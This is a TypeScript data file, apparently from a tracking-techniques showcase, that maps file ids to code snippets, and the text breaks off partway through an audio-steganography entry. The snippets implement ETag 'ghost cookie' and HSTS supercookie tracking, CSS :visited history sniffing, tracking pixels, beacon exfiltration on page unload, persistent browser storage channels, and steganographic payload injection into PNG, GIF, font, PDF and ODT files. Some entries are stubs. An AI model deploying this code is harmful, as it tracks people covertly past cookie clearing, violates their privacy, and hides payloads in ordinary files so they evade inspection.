
// ── CODE SNIPPETS ─────────────────────────────────────────────────────────────
// Each entry is keyed by file id (the `id` field on FileNode).
// Long entries use template literals; escape backticks/${} carefully.

export const CODE: Record<string, string> = {
  // ── ETag ghost cookie server ─────────────────────────────────────────────────
  "etag-srv": `// favicon_rebel.js — ETag ghost cookie server
// REF: Favicon - Counter / Blueprint.txt
const http   = require('http');
const crypto = require('crypto');

// 16×16 transparent PNG — the innocent face
const ICON = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/' +
  '9hAAAABmJLR0QA/wD/AP+gvaeTAAAADUlEQVQ4y2Ng' +
  'YGBgAAAABQABXvMqGgAAAABJRU5ErkJggg==', 'base64'
);

const db = new Map();  // in-memory; use Redis in prod

http.createServer((req, res) => {
  const ip      = req.socket.remoteAddress;
  const ua      = req.headers['user-agent'] || '—';
  const ref     = req.headers['referer']    || '—';
  const incoming = req.headers['if-none-match'];

  // Resurrect identity from ghost cookie
  if (incoming) {
    const rec = db.get(incoming);
    if (rec) { rec.hits++; rec.last = Date.now(); }
    else db.set(incoming, { ip, ua, ref, hits: 1, ts: Date.now() });
  }

  const id = 'W/"' + crypto.randomUUID() + '"';
  db.set(id, { ip, ua, ref, hits: 0, ts: Date.now(), last: Date.now() });

  res.setHeader('ETag', id);
  res.setHeader('Cache-Control', 'max-age=31536000, immutable');
  res.setHeader('Content-Type', 'image/x-icon');
  res.writeHead(200);
  res.end(ICON);

}).listen(3000, () => {
  console.log('[rebel] :3000 — waiting for ghosts');
});`,

  "etag-mw": `// middleware/etag.js — reverse-proxy ETag stripper
// Strips ETag at the edge OR generates fresh per-request
module.exports = function etagMiddleware(req, res, next) {
  const incoming = req.headers['if-none-match'];
  if (incoming) {
    req._ghostCookie = incoming;
    delete req.headers['if-none-match'];
  }
  // Strip any upstream ETag so the browser can't pin a user
  res.removeHeader('ETag');
  res.setHeader('Cache-Control', 'no-store, max-age=0');
  next();
};`,

  "etag-log": `// logger.js — hit logger for ETag ghosts
const fs = require('fs');
const path = require('path');

const LOG = path.join(__dirname, '..', 'logs', 'ghost.log');

module.exports = function logHit(rec) {
  const line = JSON.stringify({
    ts: Date.now(), id: rec.id, ip: rec.ip,
    ua: rec.ua.slice(0, 64), ref: rec.ref.slice(0, 128),
  }) + '\\n';
  fs.appendFile(LOG, line, () => {});
};`,

  "etag-dash": `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ETag Ghost — Tracking Log</title>
  <style>
    * { box-sizing: border-box; }
    body { background: #0e0c09; color: #cec0a4;
           font: 12px/1.5 monospace; padding: 20px; }
    h2   { color: #c87820; margin-bottom: 16px; font-size: 14px;
           letter-spacing: .1em; }
    table { border-collapse: collapse; width: 100%; }
    th   { color: #7a6848; font-size: 10px; text-align: left;
           padding: 4px 10px; border-bottom: 1px solid #2c2218; }
    td   { padding: 5px 10px; border-bottom: 1px solid #1f1b14; }
    .hit { color: #b82a20; }
    .new { color: #c87820; }
  </style>
</head>
<body>
  <h2>ETag / ghost-cookie log</h2>
  <div id="stats" style="color:#7a6848;font-size:10px;margin-bottom:12px"></div>
  <table>
    <thead><tr>
      <th>ETag (8)</th><th>IP</th><th>UA</th>
      <th>Referer</th><th>hits</th><th>last</th>
    </tr></thead>
    <tbody id="tbody"></tbody>
  </table>
  <script>
    async function refresh() {
      const rows = await fetch('/api/log').then(r => r.json());
      document.getElementById('stats').textContent =
        rows.length + ' identities tracked — refreshing every 5s';
      document.getElementById('tbody').innerHTML = rows.map(r => \`
        <tr>
          <td class="new">\${r.id.replace(/['"]/g,'').slice(0,8)}…</td>
          <td>\${r.ip}</td>
          <td>\${(r.ua||'').slice(0,36)}…</td>
          <td>\${(r.ref||'').slice(0,48)}</td>
          <td class="hit">\${r.hits}</td>
          <td>\${new Date(r.last).toISOString().slice(11,19)}</td>
        </tr>\`).join('');
    }
    refresh();
    setInterval(refresh, 5000);
  </script>
</body>
</html>`,

  // ── Service Worker / BSCA channels ───────────────────────────────────────────
  "sw-main": `// sw.js — Service Worker as Cache API write channel
// BSCA Type: W | Phase: 2 | Persist: V.HIGH
const CACHE = '__bsca_ch';
const KEY   = '/__fp';

self.addEventListener('install',  e => e.waitUntil(self.skipWaiting()));
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));

async function write(payload) {
  const cache = await caches.open(CACHE);
  await cache.put(KEY, new Response(JSON.stringify(payload)));
}

async function read() {
  const cache = await caches.open(CACHE);
  const res   = await cache.match(KEY);
  return res ? res.json() : null;
}

self.addEventListener('message', async ({ data, source }) => {
  if (data?.t === 'W') { await write(data.p); source.postMessage({ ok: true }); }
  if (data?.t === 'R') { source.postMessage({ v: await read() }); }
  if (data?.t === 'X') { const c = await caches.open(CACHE); await c.delete(KEY); }
});`,

  "sw-probe": `// probe.js — check whether SW channel is writable
export async function probe() {
  if (!('serviceWorker' in navigator)) return { ok:false, reason:'no SW' };
  const reg = await navigator.serviceWorker.register('/sw.js');
  await navigator.serviceWorker.ready;
  return new Promise(resolve => {
    const ch = new MessageChannel();
    ch.port1.onmessage = e => resolve({ ok:true, v:e.data.v });
    navigator.serviceWorker.controller.postMessage({ t:'R' }, [ch.port2]);
    setTimeout(() => resolve({ ok:false, reason:'timeout' }), 1500);
  });
}`,

  "sw-reg": `// register.js — SW registration + scope lock
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js', { scope: '/' })
    .then(reg => console.log('[sw] scope:', reg.scope))
    .catch(err => console.warn('[sw] failed:', err));
}`,

  "hsts-nginx": `# nginx.conf — HSTS supercookie writer
# BSCA Type: P | Phase: 0 | Persist: HIGH
# Per-client max-age encodes the identity bits

server {
  listen 443 ssl http2;
  server_name .target.example.com;

  # Issue unique max-age per IP — encode 5 bits per response
  location = /hsts-beacon {
    add_header Strict-Transport-Security
      "max-age=$arg_v; includeSubDomains; preload" always;
    add_header Cache-Control "no-store" always;
    add_header Content-Type  "image/gif" always;
    return 200 "";
  }

  # Reader: detect presence of HSTS by checking redirect behavior
  location = /hsts-probe {
    if ($scheme = http) {
      return 301 https://$host/hsts-probe;
    }
    add_header X-HSTS-State "locked" always;
    return 200 "locked\\n";
  }
}`,

  "hsts-probe": `<!DOCTYPE html>
<!-- hsts-probe.html — detect HSTS lock by HTTP→HTTPS redirect -->
<script>
  // Initial HTTP fetch — will be redirected if HSTS is locked
  fetch('http://target.example.com/hsts-probe', { redirect:'manual' })
    .then(r => {
      // type 'opaqueredirect' = HSTS lock present
      const locked = r.type === 'opaqueredirect';
      document.body.innerText = 'HSTS: ' + (locked ? 'LOCKED ✓' : 'absent ✗');
      navigator.sendBeacon('/fp/collect',
        JSON.stringify({ ts:Date.now(), type:'hsts', locked }));
    });
</script>`,

  "hsts-read": `// read.js — read HSTS state from JS
// 30 bits of identity encoded in max-age values
export async function readHSTS() {
  // Probe each bit-slot in parallel: if locked, the bit is 1
  const slots = await Promise.all(
    Array.from({length:30}, (_,i) => probeBit(i))
  );
  let id = 0n;
  slots.forEach((v, i) => { if (v) id |= (1n << BigInt(i)); });
  return { id: id.toString(16), bits: slots.filter(Boolean).length };
}

async function probeBit(bit) {
  // Attempt HTTP fetch to bit-URL — locked = true if auto-redirected
  try {
    const r = await fetch(\`http://bit-\${bit}.target.example.com/\`, {
      redirect:'manual', mode:'no-cors',
    });
    return r.type === 'opaqueredirect';
  } catch { return false; }
}`,

  "ls-write": `// write.js — localStorage persistent channel
// BSCA Type: W | Phase: 0 | Persist: HIGH | Cap: 5 MB
export function write(key, val) {
  try { localStorage.setItem('__mf_' + key, JSON.stringify(val)); }
  catch (e) { console.warn('[ls] quota', e); }
}`,

  "ls-read": `// read.js
export function read(key) {
  try {
    const v = localStorage.getItem('__mf_' + key);
    return v ? JSON.parse(v) : null;
  } catch { return null; }
}`,

  "ls-wipe": `// wipe.js — purge all __mf_ keys on logout
export function wipe() {
  for (let i = localStorage.length - 1; i >= 0; i--) {
    const k = localStorage.key(i);
    if (k?.startsWith('__mf_')) localStorage.removeItem(k);
  }
}`,

  "idb-chan-js": `// channel.js — IndexedDB structured channel
// BSCA Type: W | Phase: 1 | Persist: V.HIGH | Cap: 50+ MB
const DB = '__bsca_idb';
const STORE = 'kv';

function open() {
  return new Promise((res, rej) => {
    const r = indexedDB.open(DB, 1);
    r.onupgradeneeded = () => r.result.createObjectStore(STORE);
    r.onsuccess = () => res(r.result);
    r.onerror   = () => rej(r.error);
  });
}

export async function write(key, val) {
  const db = await open();
  return new Promise((res, rej) => {
    const tx = db.transaction(STORE, 'readwrite');
    tx.objectStore(STORE).put(val, key);
    tx.oncomplete = res;
    tx.onerror   = () => rej(tx.error);
  });
}

export async function read(key) {
  const db = await open();
  return new Promise((res, rej) => {
    const tx = db.transaction(STORE, 'readonly');
    const r  = tx.objectStore(STORE).get(key);
    r.onsuccess = () => res(r.result);
    r.onerror   = () => rej(r.error);
  });
}`,

  "idb-schema": `// schema.js — IDB schema migrations
// Bump version on each new field — never delete old stores
export const VERSION = 3;

export const MIGRATIONS = [
  { v:1, op: db => db.createObjectStore('kv') },
  { v:2, op: db => db.createObjectStore('idx', { keyPath:'ts' }) },
  { v:3, op: db => db.createObjectStore('blob') },
];`,

  "opfs-js": `// opfs.js — origin private file system channel
// BSCA Type: W | Phase: 1 | Persist: V.HIGH | Cap: ∞
const ROOT = await navigator.storage.getDirectory();
const FILE = 'channel.bin';

export async function write(payload) {
  const fh = await ROOT.getFileHandle(FILE, { create: true });
  const w  = await fh.createWritable();
  await w.write(JSON.stringify(payload));
  await w.close();
}

export async function read() {
  try {
    const fh = await ROOT.getFileHandle(FILE);
    const f  = await fh.getFile();
    return JSON.parse(await f.text());
  } catch { return null; }
}`,

  "opfs-worker": `// worker.js — OPFS writer running off-main-thread
import * as OPFS from './opfs.js';

self.onmessage = async ({ data }) => {
  if (data.t === 'W') {
    await OPFS.write(data.p);
    self.postMessage({ ok: true });
  } else if (data.t === 'R') {
    self.postMessage({ v: await OPFS.read() });
  }
};`,

  "sab-timer": `// timer.js — SharedArrayBuffer timing side-channel
// BSCA Type: P | Phase: 2 | Persist: NONE | Cap: ~1 bit/cycle
const BUF = new SharedArrayBuffer(4);
const arr = new Int32Array(BUF);

export function signalBit(bit) {
  Atomics.store(arr, 0, bit);
  Atomics.notify(arr, 0);
}

export function waitForBit(timeout = 1000) {
  const r = Atomics.wait(arr, 0, 0, timeout);
  if (r === 'ok') return Atomics.load(arr, 0);
  return null;
}`,

  "sab-worker": `// worker.js — paired worker for SAB channel
self.onmessage = () => {
  // Worker holds the other end of the SharedArrayBuffer
  // and emits timing-only signals observable by the main thread
  const buf = new SharedArrayBuffer(4);
  const arr = new Int32Array(buf);
  setInterval(() => {
    Atomics.store(arr, 0, Date.now() & 1);
    Atomics.notify(arr, 0);
  }, 50);
};`,

  "ep-probe": `// probe.js — ETag read-only fingerprint probe
// BSCA Type: P | Phase: 0 | Persist: MEDIUM
export async function probe(url) {
  // First fetch — server issues an ETag tied to our identity
  await fetch(url, { cache:'force-cache' });
  // Second fetch — if cached, server learns we're back
  const r = await fetch(url, { cache:'force-cache' });
  return { status: r.status, etag: r.headers.get('etag') };
}`,

  "ep-server": `// server.js — minimal ETag-issuing server
const http = require('http');
const crypto = require('crypto');
const ICON = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACWlETSGR0AABAAAA', 'base64');

http.createServer((req, res) => {
  const etag = '"' + crypto.randomUUID().slice(0, 16) + '"';
  res.setHeader('ETag', etag);
  res.setHeader('Cache-Control', 'max-age=31536000, immutable');
  res.setHeader('Content-Type', 'image/png');
  res.writeHead(200);
  res.end(ICON);
}).listen(3030);`,

  "bc-chan": `// channel.js — BroadcastChannel cross-tab messaging
// BSCA Type: W | Phase: 0 | Persist: SESSION
const CH = new BroadcastChannel('__mf_bc');

export function post(msg) { CH.postMessage(msg); }

CH.onmessage = e => {
  // Cross-tab relay — used to detect tab close/open events
  console.log('[bc]', e.data);
};`,

  "bc-listen": `// listener.js
import { post } from './channel.js';

// On focus change, broadcast — paired tab picks up identity
window.addEventListener('focus', () => post({ t:'focus', ts:Date.now() }));
window.addEventListener('blur',  () => post({ t:'blur',  ts:Date.now() }));

// Unload beacon — signals "session end"
window.addEventListener('pagehide',
  () => post({ t:'end', ts:Date.now() }));`,

  "sw-shared-js": `// worker.js — SharedWorker — shared context across tabs
onconnect = e => {
  const port = e.ports[0];
  port.onmessage = ({ data }) => {
    // Broadcast to all connected ports
    for (const p of ports) p.postMessage(data);
  };
  ports.add(port);
  port.start();
};
const ports = new Set();`,

  "sw-shared-conn": `// connect.js — main-thread SharedWorker client
const w = new SharedWorker(new URL('./worker.js', import.meta.url), { type:'module' });
const port = w.port;
port.start();

export function send(msg) { port.postMessage(msg); }
port.onmessage = e => console.log('[shared]', e.data);`,

  // ── TRACKING ────────────────────────────────────────────────────────────────
  "gif-py": `# pixel.py — GIF tracking pixel generator
# REF: GIF / core_stego.py + server.py
import struct, time, hashlib

# Minimal 1×1 transparent GIF89a
GIF_HEADER = (
    b'GIF89a'
    + struct.pack('<HH', 1, 1)   # width, height
    + b'\\x80\\x00\\x00'         # GCT flag, bg, aspect
    + b'\\xff\\xff\\xff'          # color 0 — white
    + b'\\x00\\x00\\x00'          # color 1 — black
    + b'!\\xf9\\x04\\x01\\x00\\x00\\x00\\x00'  # GCE transparent
    + b',\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\x00'  # image desc
    + b'\\x02\\x02\\x4c\\x01\\x00'  # LZW data
    + b';'                       # trailer
)

def make_pixel(seed: str) -> bytes:
    """Generate a 1×1 GIF seeded with a unique nonce in Comment Extension."""
    nonce = hashlib.sha1((seed + str(time.time())).encode()).hexdigest()[:8]
    comment = b'!\\xfe' + bytes([len(nonce)]) + nonce.encode() + b'\\x00'
    return b'GIF89a' + GIF_HEADER[6:].replace(b';', comment + b';')

def log_hit(env: dict) -> dict:
    return {
        'ts':  time.time(),
        'ip':  env.get('REMOTE_ADDR', '—'),
        'ua':  env.get('HTTP_USER_AGENT', '—')[:128],
        'ref': env.get('HTTP_REFERER',    '—')[:256],
    }`,

  "gif-srv": `# server.py — minimal tracking-pixel HTTP server
from http.server import BaseHTTPRequestHandler, HTTPServer
from pixel import make_pixel, log_hit

class H(BaseHTTPRequestHandler):
  def do_GET(self):
    env = {k: v for k, v in self.headers.items()}
    env['REMOTE_ADDR'] = self.client_address[0]
    log_hit(env)
    body = make_pixel(self.path)
    self.send_response(200)
    self.send_header('Content-Type', 'image/gif')
    self.send_header('Cache-Control', 'no-store')
    self.end_headers()
    self.wfile.write(body)

HTTPServer(('', 8080), H).serve_forever()`,

  "gif-dash": `<!-- dashboard.html — pixel hit viewer -->
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>pixel log</title>
<style>
  body { background:#0e0c09; color:#cec0a4; font:12px monospace; padding:20px; }
  table { width:100%; border-collapse:collapse; }
  th { color:#7a6848; font-size:10px; padding:4px 8px; text-align:left;
       border-bottom:1px solid #2c2218; }
  td { padding:5px 8px; border-bottom:1px solid #1f1b14; }
</style></head>
<body>
  <h2 style="color:#c87820; font-size:14px; margin-bottom:12px;">PIXEL HITS</h2>
  <table id="t"><thead><tr>
    <th>ts</th><th>ip</th><th>ua</th><th>ref</th>
  </tr></thead><tbody id="b"></tbody></table>
  <script>
    fetch('/api/hits').then(r => r.json()).then(rows => {
      document.getElementById('b').innerHTML = rows.map(r => \`
        <tr><td>\${new Date(r.ts*1000).toISOString().slice(11,19)}</td>
            <td>\${r.ip}</td>
            <td>\${(r.ua||'').slice(0,40)}</td>
            <td>\${(r.ref||'').slice(0,48)}</td></tr>\`).join('');
    });
  </script>
</body></html>`,

  "anim-gen": `# gen.py — animated GIF generator with frame-timing payload
import struct, hashlib

def build(frames, delays, seed):
  """frames: list of 1x1 RGBA bytes; delays: per-frame centiseconds"""
  out = b'GIF89a'
  out += struct.pack('<HH', 1, 1) + b'\\x80\\x00\\x00'
  out += b'\\xff\\xff\\xff\\x00\\x00\\x00'
  # NETSCAPE2.0 loop
  out += b'!\\xff\\x0bNETSCAPE2.0\\x03\\x01\\x00\\x00\\x00'
  for fr, d in zip(frames, delays):
    out += b'!\\xf9\\x04\\x00' + struct.pack('<H', d) + b'\\x00\\x00'
    out += b',\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\x00'
    out += b'\\x02\\x02\\x4c\\x01\\x00'
  out += b';'
  return out

# Encode 4 bits per frame delay value (centiseconds 20..35 = 16 distinct)
def encode(payload: bytes) -> list[int]:
  bits = ''.join(f'{b:08b}' for b in payload)
  delays = []
  for i in range(0, len(bits), 4):
    nibble = int(bits[i:i+4], 2)
    delays.append(20 + nibble)  # 20..35 cs
  return delays`,

  "anim-embed": `# embed.py — embed a payload into an existing animated GIF
# by mutating frame delays while preserving visible content
import struct

def embed(gif_bytes: bytes, payload: bytes) -> bytes:
  # Walk graphic-control extensions; rewrite delay field
  out = bytearray()
  i, n = 0, len(gif_bytes)
  pi = 0
  bits = ''.join(f'{b:08b}' for b in payload) + '0' * 4
  while i < n:
    if gif_bytes[i:i+3] == b'!\\xf9\\x04':
      out += gif_bytes[i:i+3]
      flags = gif_bytes[i+3]
      out += bytes([flags])
      # delay is 2 bytes little-endian at i+4..i+5
      if pi < len(bits):
        nib = int(bits[pi:pi+4], 2)
        out += struct.pack('<H', 20 + nib)
        pi += 4
      else:
        out += gif_bytes[i+4:i+6]
      out += gif_bytes[i+6:i+8]
      i += 8
    else:
      out += bytes([gif_bytes[i]]); i += 1
  return bytes(out)`,

  "css-probe": `/* probe.css — CSS background-image tracker
   BSCA Type: P | Phase: 1 | Persist: SESSION
   Mechanism: load URL only if selector matches (:visited, :hover, etc.) */

a:visited.visited-001 { background: url(/beacon?sel=visited-001); }
a:visited.visited-002 { background: url(/beacon?sel=visited-002); }
a:visited.visited-003 { background: url(/beacon?sel=visited-003); }

/* Detect browser dark mode — fires one URL or the other */
@media (prefers-color-scheme: dark) {
  body { background: url(/beacon?theme=dark); }
}
@media (prefers-color-scheme: light) {
  body { background: url(/beacon?theme=light); }
}`,

  "css-srv": `# server.py — collect CSS-beacon hits
from http.server import BaseHTTPRequestHandler, HTTPServer
import json, time

HITS = []

class H(BaseHTTPRequestHandler):
  def do_GET(self):
    HITS.append({ 'ts': time.time(),
                  'sel': self.path.split('sel=')[-1] if 'sel=' in self.path else None,
                  'ip':  self.client_address[0] })
    # 1×1 transparent GIF
    self.send_response(200)
    self.send_header('Content-Type', 'image/gif')
    self.end_headers()
    self.wfile.write(b'GIF89a\\x01\\x00\\x01\\x00\\x80\\x00\\x00\\xff\\xff\\xff\\x00\\x00\\x00!\\xf9\\x04\\x01\\x00\\x00\\x00\\x00,\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x02\\x02L\\x01\\x00;')
  def log_message(self, *a): pass

HTTPServer(('', 8081), H).serve_forever()`,

  "nb-js": `// beacon.js — navigator.sendBeacon wrapper
// BSCA Type: W | Phase: 1 | Persist: SESSION | Cap: 64 KB
export function beacon(url, payload) {
  const blob = new Blob([JSON.stringify(payload)],
                        { type:'application/json' });
  return navigator.sendBeacon(url, blob);
}

// Fire on unload — last-ditch exfil
window.addEventListener('pagehide',
  () => beacon('/collect/unload', {
    ts: Date.now(),
    path: location.pathname,
    ttfb: performance.timing.responseStart - performance.timing.requestStart,
  }));
`,

  "nb-collect": `# collect.py — Flask beacon collector
from flask import Flask, request
import json

app = Flask(__name__)

@app.post('/collect/<kind>')
def collect(kind):
  body = request.get_data(as_text=True)
  print(f'[{kind}] {request.remote_addr} :: {body[:256]}')
  return '', 204

if __name__ == '__main__':
  app.run(port=8082)`,

  "ws-cli": `// client.js — WebSocket beacon
// BSCA Type: W | Phase: 1 | Persist: SESSION
const ws = new WebSocket('wss://relay.example.com/track');

ws.onopen = () => {
  // Steady ping keeps connection alive and informs server of session
  setInterval(() => ws.send(JSON.stringify({
    t: Date.now(), path: location.pathname,
  })), 5000);
};

ws.onclose = () => console.warn('[ws] closed');
ws.onerror = e => console.error('[ws]', e);`,

  "ws-srv": `// server.js — WebSocket relay
const { WebSocketServer } = require('ws');
const wss = new WebSocketServer({ port: 8083 });

wss.on('connection', (ws, req) => {
  const ip = req.socket.remoteAddress;
  console.log('[ws] connect', ip);
  ws.on('message', m => {
    const msg = JSON.parse(m);
    console.log('[ws]', ip, msg.t, msg.path);
  });
});`,

  "mqtt-cli": `// client.js — MQTT beacon via MQTT.js over WebSocket
import mqtt from 'mqtt';

const c = mqtt.connect('wss://broker.example.com:9001', {
  clientId: 'mf_' + Math.random().toString(36).slice(2,8),
});

c.on('connect', () => {
  c.subscribe('mf/hits/' + location.hostname);
  c.publish('mf/connect', JSON.stringify({
    ts: Date.now(), path: location.pathname,
  }));
});`,

  "mqtt-broker": `# broker.py — minimal MQTT broker using hbmqtt
import asyncio, logging
from hbmqtt.broker import Broker

CONFIG = {
  'listeners': {'default': {'type': 'tcp', 'bind': '0.0.0.0:1883'}},
  'auth': {'allow-anonymous': True},
  'sys_interval': 10,
}

async def main():
  b = Broker(CONFIG)
  await b.start()
  print('[mqtt] listening :1883')
  await asyncio.Future()  # run forever

logging.basicConfig(level=logging.INFO)
asyncio.run(main())`,

  "rh-html": `<!DOCTYPE html>
<!-- hints.html — Resource Hints beacon
     BSCA Type: P | Phase: 0 | Persist: SESSION
     Each preconnect fires a DNS+TLS probe -->
<head>
  <link rel="preconnect" href="https://relay-1.example.com">
  <link rel="preconnect" href="https://relay-2.example.com">
  <link rel="preconnect" href="https://relay-3.example.com">
  <link rel="dns-prefetch" href="https://probe.example.com">
  <link rel="prefetch" as="image" href="/probe.png?visited=true">
</head>
<body>open devtools network tab → watch for relay hits</body>`,

  "rh-probe": `// probe.js — measure which preconnects fired
export async function probe() {
  const targets = ['relay-1', 'relay-2', 'relay-3'].map(n => n + '.example.com');
  const results = await Promise.all(targets.map(async t => {
    const start = performance.now();
    try {
      await fetch(\`https://\${t}/ping\`, { mode:'no-cors' });
      return { host:t, delta: performance.now()-start, ok:true };
    } catch {
      return { host:t, delta: performance.now()-start, ok:false };
    }
  }));
  // Sub-10ms = already preconnected (HSTS / DNS cache hit)
  return results.filter(r => r.delta < 10);
}`,

  "ntp-probe": `// probe.js — NTP-style clock-skew probe
// BSCA Type: P | Phase: 1 | Persist: HIGH
// Server returns Date header; client compares to local clock.
export async function probe() {
  const t0 = Date.now();
  const r = await fetch('/ntp', { cache:'no-store' });
  const t1 = Date.now();
  const serverTime = Date.parse(r.headers.get('date'));
  const rtt = (t1 - t0) / 2;
  const skew = serverTime - (t0 + rtt);
  return { skew_ms: skew, rtt_ms: rtt*2 };
}`,

  "ntp-srv": `// server.js — accurate-time HTTP endpoint
const http = require('http');
http.createServer((req, res) => {
  res.setHeader('Date', new Date().toUTCString());
  res.setHeader('Cache-Control', 'no-store');
  res.writeHead(204);
  res.end();
}).listen(3031);`,

  // ── STEGANOGRAPHY ─────────────────────────────────────────────────────────────
  "png-embed": `// embed.ts — PNG LSB embedding
// REF: StegosaurusApp / png-encoder
// Capacity: ~12.5% of pixels × 3 channels
import { PNG } from 'pngjs';

export async function embed(pngBuf: Buffer, payload: Buffer): Promise<Buffer> {
  const png = PNG.sync.read(pngBuf);
  const bits: number[] = [];
  for (const b of payload) for (let i = 7; i >= 0; i--) bits.push((b >> i) & 1);
  // Header: 32-bit length prefix
  const len = payload.length;
  for (let i = 31; i >= 0; i--) bits.unshift((len >> i) & 1);

  let bi = 0;
  for (let y = 0; y < png.height && bi < bits.length; y++) {
    for (let x = 0; x < png.width && bi < bits.length; x++) {
      const idx = (png.width * y + x) << 2;
      for (let c = 0; c < 3 && bi < bits.length; c++, bi++) {
        png.data[idx + c] = (png.data[idx + c] & 0xFE) | bits[bi];
      }
    }
  }
  return PNG.sync.write(png);
}`,

  "png-extract": `// extract.ts — recover LSB payload
import { PNG } from 'pngjs';

export async function extract(pngBuf: Buffer): Promise<Buffer> {
  const png = PNG.sync.read(pngBuf);
  const bits: number[] = [];
  for (let i = 0; i < png.data.length; i += 4) {
    for (let c = 0; c < 3; c++) bits.push(png.data[i + c] & 1);
    if (bits.length >= 32 + 8 * 1024) break;
  }
  // Read length header
  let len = 0;
  for (let i = 0; i < 32; i++) len = (len << 1) | bits[i];
  if (len > 65536) throw new Error('implausible length');
  // Read body
  const out = Buffer.alloc(len);
  for (let i = 0; i < len; i++) {
    let b = 0;
    for (let j = 0; j < 8; j++) b = (b << 1) | bits[32 + i*8 + j];
    out[i] = b;
  }
  return out;
}`,

  "png-worker": `// worker.ts — off-main-thread PNG stego
import { embed, extract } from './embed';
self.onmessage = async ({ data }) => {
  if (data.t === 'E') self.postMessage({ v: await embed(data.png, data.p) });
  if (data.t === 'X') self.postMessage({ v: await extract(data.png) });
};`,

  "gs-engine": `# engine.py — GIF stego core
# REF: GIF / src/lib/engine.py
import struct

class GifStego:
    """Frame-delay covert channel + LZW palette manipulation."""

    def __init__(self, gif: bytes):
        self.gif = gif
        self.frames = self._parse(gif)

    def embed(self, payload: bytes) -> bytes:
        bits = ''.join(f'{b:08b}' for b in payload)
        delays = [20 + int(bits[i:i+4], 2) for i in range(0, len(bits), 4)]
        # Re-emit with rewritten delays
        return self._rewrite(delays)

    def extract(self) -> bytes:
        # Read delay values back, reassemble nibbles into bytes
        nibbles = [(d - 20) for d in self._read_delays()]
        bits = ''.join(f'{n:04b}' for n in nibbles)
        return bytes(int(bits[i:i+8], 2) for i in range(0, len(bits), 8))

    def _parse(self, gif): pass
    def _rewrite(self, delays): pass
    def _read_delays(self): pass`,

  "gs-parser": `# parser.py — GIF LZW + frame parser
import struct

def parse(gif: bytes) -> list:
    """Walk GIF89a blocks; extract frame delays."""
    frames = []
    i, n = 13, len(gif)  # skip header + GCT
    while i < n:
        b = gif[i]
        if b == 0x21 and gif[i+1] == 0xF9:
            # Graphic Control Extension — delay at i+4..i+5
            d = struct.unpack('<H', gif[i+4:i+6])[0]
            frames.append(d)
            i += 8
        elif b == 0x2C: i += 10  # image descriptor (skip)
        elif b == 0x3B: break    # trailer
        else: i += 1
    return frames`,

  "gs-chaos": `# chaos.py — deterministic chaos scrambling for stego payload
# Logistic map: x[n+1] = r * x[n] * (1 - x[n])
# r = 3.99 gives a chaotic sequence that we use as a permutation key
def permute(buf: bytes, seed: int, r: float = 3.99) -> bytes:
    x = (seed % 1000) / 1000
    order = list(range(len(buf)))
    for i in range(len(buf)):
        x = r * x * (1 - x)
        j = int(x * (i + 1))
        order[i], order[j] = order[j], order[i]
    return bytes(buf[k] for k in order)`,

  "wf-embed": `// font_steg.ts — woff2 hmtx advance-width mutation
// REF: StegosaurusApp / woff2 encoder
// Capacity: ~2 bits per glyph (advance-width low bits)
import { encode, decode } from 'woff2-decoder';

export async function embed(fontBuf: Uint8Array, payload: Uint8Array): Promise<Uint8Array> {
  const ttf = decode(fontBuf);
  const view = new DataView(ttf.buffer);

  // Locate hmtx table — read numGlyphs from hhea
  const numGlyphs = view.getUint16(8, false);  // simplified
  const bits: number[] = [];
  for (const b of payload) for (let i = 7; i >= 0; i--) bits.push((b >> i) & 1);

  // For each glyph, encode 2 bits into the low bits of advanceWidth
  // (advanceWidth changes of 1-3 thousandths of an em are visually invisible)
  // ...omitted: actual table-walk
  return encode(ttf);
}`,

  "wf-extract": `// extract.ts — read hmtx-embedded payload back
import { decode } from 'woff2-decoder';

export async function extract(fontBuf: Uint8Array): Promise<Uint8Array> {
  const ttf = decode(fontBuf);
  // ... walk hmtx, collect 2 bits per glyph
  return new Uint8Array();
}`,

  "pdf-inject": `# inject.py — PDF XMP + trailer payload
# REF: Trojan_Horse / inject_pdf.py
import zlib

def inject(pdf: bytes, payload: bytes) -> bytes:
    """Append a hidden stream object; reference from /Info dict."""
    obj_num = b'999 0'
    stream = zlib.compress(payload)
    new_obj = (
        obj_num + b' obj\\n'
        b'<< /Length ' + str(len(stream)).encode() + b' /Filter /FlateDecode >>\\n'
        b'stream\\n' + stream + b'\\nendstream\\nendobj\\n'
    )
    # Splice before trailer
    trailer_idx = pdf.rfind(b'trailer')
    return pdf[:trailer_idx] + new_obj + pdf[trailer_idx:]`,

  "pdf-read": `# read.py — read injected PDF stream back
import zlib

def read(pdf: bytes) -> bytes:
    """Find our hidden stream object, decompress, return."""
    marker = b'999 0 obj\\n<< /Length '
    i = pdf.find(marker)
    if i < 0: return b''
    # parse /Length, find stream...endstream
    j = pdf.find(b'stream\\n', i) + 7
    k = pdf.find(b'\\nendstream', j)
    return zlib.decompress(pdf[j:k])`,

  "odt-py": `# inject_odt.py — ODT (ZIP) extra-field payload
# REF: Trojan_Horse / inject_zip.py
import zipfile, io

def inject(odt: bytes, payload: bytes) -> bytes:
    """Open ODT, add payload as 'Extra' field on an existing ZIP entry."""
    src = zipfile.ZipFile(io.BytesIO(odt), 'r')
    out = io.BytesIO()
    with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as w:
        for item in src.infolist():
            data = src.read(item.filename)
            # Append payload to extra field — invisible to LibreOffice
            item.extra += b'\\x49\\x4d\\x46' + len(payload).to_bytes(4,'little') + payload
            w.writestr(item, data)
    return out.getvalue()`,

  "odt-ex": `# extract_odt.py — read ZIP extra-field payload back
import zipfile, io

def extract(odt: bytes) -> bytes:
    z = zipfile.ZipFile(io.BytesIO(odt), 'r')
    for info in z.infolist():
        e = info.extra
        i = e.find(b'\\x49\\x4d\\x46')
        if i >= 0:
            ln = int.from_bytes(e[i+3:i+7], 'little')
            return e[i+7 : i+7+ln]
    return b''`,

  "wav-embed": `// audio_steg.ts — WAV PCM LSB embedding
